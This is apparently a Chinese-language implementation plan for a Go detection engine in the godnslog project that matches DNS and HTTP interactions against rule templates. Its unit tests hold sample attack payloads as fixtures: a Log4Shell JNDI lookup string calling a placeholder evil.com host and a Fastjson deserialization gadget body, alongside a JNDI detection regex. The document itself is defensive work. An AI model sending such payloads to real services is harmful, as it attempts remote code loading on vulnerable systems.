# Phase 19 Spec D: Template 插件化执行引擎 — 实现计划

- [ ] **Step 1: 创建执行引擎包**

创建 `internal/marketplace/executor/engine.go`：

```go
// 模板定义解析、匹配、执行
// Template 结构定义匹配条件和执行动作
// Engine 加载激活的模板，对 Interaction 进行匹配
```

```go
package executor

import (
	"encoding/json"
	"regexp"
	"strings"

	"github.com/chennqqi/godnslog/internal/models"
)

// MatchRule 定义匹配条件
type MatchRule struct {
	Type    string `json:"type"`    // regex, contains, equals
	Pattern string `json:"pattern"` // 匹配模式
	Field   string `json:"field"`   // domain, path, body, header
}

// Action 定义匹配后的动作
type Action struct {
	Type  string `json:"type"`  // tag, block, notify
	Value string `json:"value"` // 动作参数
}

// TemplateDef 模板定义（解析后的 JSON Content）
type TemplateDef struct {
	Name        string     `json:"name"`
	Description string     `json:"description"`
	Protocols   []string   `json:"protocols"`
	Match       MatchRule  `json:"match"`
	Action      Action     `json:"action"`
	Severity    string     `json:"severity"`
}

// MatchResult 匹配结果
type MatchResult struct {
	TemplateName string
	Severity     string
	Action       Action
	Evidence     string
}

// Engine 模板匹配引擎
type Engine struct {
	templates []TemplateDef
}

// NewEngine 从模板列表创建引擎实例
func NewEngine(templates []TemplateDef) *Engine {
	return &Engine{templates: templates}
}

// Match 对 Interaction 执行模板匹配
func (e *Engine) Match(interaction *models.Interaction) []MatchResult {
	// 遍历模板，检查协议是否匹配
	// 提取匹配字段（domain/path/body/header）
	// 执行匹配规则（regex/contains/equals）
	// 返回所有匹配结果
}
```

- [ ] **Step 2: 创建 `internal/marketplace/executor/executor.go`**

```go
package executor

import (
	"regexp"
	"strings"

	"github.com/chennqqi/godnslog/internal/models"
)

// extractField extracts the relevant field from interaction based on MatchRule.Field
func extractField(interaction *models.Interaction, field string) string {
	switch field {
	case "domain":
		if interaction.Domain != nil {
			return *interaction.Domain
		}
	case "path":
		if interaction.Path != nil {
			return *interaction.Path
		}
	case "body":
		if interaction.Body != nil {
			return *interaction.Body
		}
	case "source_ip":
		return interaction.SourceIP
	}
	return ""
}

// matchRule checks if a value matches the given rule
func matchRule(value string, rule MatchRule) (bool, string) {
	switch rule.Type {
	case "regex":
		re, err := regexp.Compile(rule.Pattern)
		if err != nil {
			return false, ""
		}
		match := re.FindString(value)
		return match != "", match
	case "contains":
		return strings.Contains(value, rule.Pattern), rule.Pattern
	case "equals":
		return value == rule.Pattern, rule.Pattern
	}
	return false, ""
}

// Match executes all templates against an interaction
func (e *Engine) Match(interaction *models.Interaction) []MatchResult {
	var results []MatchResult
	for _, tmpl := range e.templates {
		// Protocol filter
		if len(tmpl.Protocols) > 0 {
			matched := false
			for _, p := range tmpl.Protocols {
				if strings.EqualFold(p, interaction.Type) {
					matched = true
					break
				}
			}
			if !matched {
				continue
			}
		}

		// Field extraction and matching
		value := extractField(interaction, tmpl.Match.Field)
		if value == "" {
			continue
		}

		ok, evidence := matchRule(value, tmpl.Match)
		if ok {
			results = append(results, MatchResult{
				TemplateName: tmpl.Name,
				Severity:     tmpl.Severity,
				Action:       tmpl.Action,
				Evidence:     evidence,
			})
		}
	}
	return results
}
```

- [ ] **Step 3: 创建测试 `internal/marketplace/executor/engine_test.go`**

```go
package executor

import (
	"testing"

	"github.com/chennqqi/godnslog/internal/models"
)

func TestMatchByDomainRegex(t *testing.T) {
	engine := NewEngine([]TemplateDef{
		{
			Name: "log4shell",
			Match: MatchRule{
				Type:    "regex",
				Field:   "domain",
				Pattern: `\$\{jndi:(ldap|rmi|dns)://`,
			},
			Severity: "critical",
		},
	})

	domain := "${jndi:ldap://evil.com/test}"
	interaction := &models.Interaction{
		Type:   "dns",
		Domain: &domain,
	}

	results := engine.Match(interaction)
	if len(results) != 1 {
		t.Fatalf("expected 1 match, got %d", len(results))
	}
	if results[0].TemplateName != "log4shell" {
		t.Errorf("expected log4shell, got %q", results[0].TemplateName)
	}
}

func TestMatchByBodyContains(t *testing.T) {
	engine := NewEngine([]TemplateDef{
		{
			Name: "fastjson",
			Match: MatchRule{
				Type:    "contains",
				Field:   "body",
				Pattern: `{"@type":"`,
			},
			Severity: "critical",
		},
	})

	body := `{"@type":"com.sun.rowset.JdbcRowSetImpl"}`
	interaction := &models.Interaction{
		Type: "http",
		Body: &body,
	}

	results := engine.Match(interaction)
	if len(results) != 1 {
		t.Fatalf("expected 1 match, got %d", len(results))
	}
}

func TestMatchNoProtocolMatch(t *testing.T) {
	engine := NewEngine([]TemplateDef{
		{
			Name:      "http-only",
			Protocols: []string{"http"},
			Match: MatchRule{
				Type:    "contains",
				Field:   "path",
				Pattern: "/test",
			},
			Severity: "medium",
		},
	})

	// DNS interaction should not match http-only template
	domain := "test.example.com"
	interaction := &models.Interaction{
		Type:   "dns",
		Domain: &domain,
	}

	results := engine.Match(interaction)
	if len(results) != 0 {
		t.Errorf("expected 0 matches for non-matching protocol, got %d", len(results))
	}
}
```

- [ ] **Step 4: 编译验证**

```bash
cd /data/dev/github.com/chennqqi/godnslog && go build ./internal/marketplace/executor/ && go test ./internal/marketplace/executor/ -v
```

- [ ] **Step 5: Commit**

```bash
git add internal/marketplace/executor/
git commit -m "feat: add template execution engine for detection plugins"
```
